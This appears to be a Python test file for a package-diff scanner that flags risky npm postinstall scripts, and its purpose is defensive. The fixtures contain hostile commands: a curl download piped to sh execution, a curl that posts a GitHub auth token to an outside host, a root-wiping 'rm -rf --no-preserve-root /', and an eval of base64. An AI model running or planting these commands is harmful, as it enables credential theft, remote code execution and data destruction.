import json

from depbee_analyzer.rules.diff_scan import scan_pair


def package(name: str, version: str, script: str) -> dict[str, bytes]:
    return {
        "package.json": json.dumps(
            {"name": name, "version": version, "scripts": {"postinstall": script}}
        ).encode()
    }


def findings(old: dict[str, bytes], new: dict[str, bytes]):
    return {item.rule_id: item for item in scan_pair(old, new)}


def test_download_requires_same_executed_path():
    old = package("sample", "1.0.0", "echo ready")
    hit = package("sample", "1.0.1", "curl -o /tmp/tool https://example.com/tool && sh /tmp/tool")
    miss = package("sample", "1.0.1", "curl -o /tmp/tool https://example.com/tool && sh /tmp/other")
    assert findings(old, hit)["R_download_exec"].status == "hit"
    assert findings(old, hit)["R_download_exec"].disposition == "review"
    assert findings(old, miss)["R_download_exec"].status == "no_hit"


def test_secret_send_and_root_wipe_are_new_install_behavior():
    old = package("sample", "1.0.0", "echo ready")
    new = package(
        "sample", "1.0.1",
        'curl -d "$(gh auth token)" https://example.com/receive; rm -rf --no-preserve-root /',
    )
    result = findings(old, new)
    assert result["R_secret_send"].status == "hit"
    assert result["R_install_root_wipe"].status == "hit"
    assert findings(new, new)["R_secret_send"].status == "no_hit"


def test_obfuscation_is_review_only():
    old = package("sample", "1.0.0", "echo ready")
    new = package("sample", "1.0.1", "echo ready")
    new["decode.js"] = b"eval(atob('Y29uc29sZS5sb2coMSk='))\n"
    result = findings(old, new)["R_diff_obfuscation"]
    assert (result.status, result.disposition) == ("hit", "review")


def test_different_package_identity_is_unknown():
    old = package("sample", "1.0.0", "echo ready")
    new = package("different", "1.0.1", "echo ready")
    assert all(item.status == "unknown" for item in scan_pair(old, new))
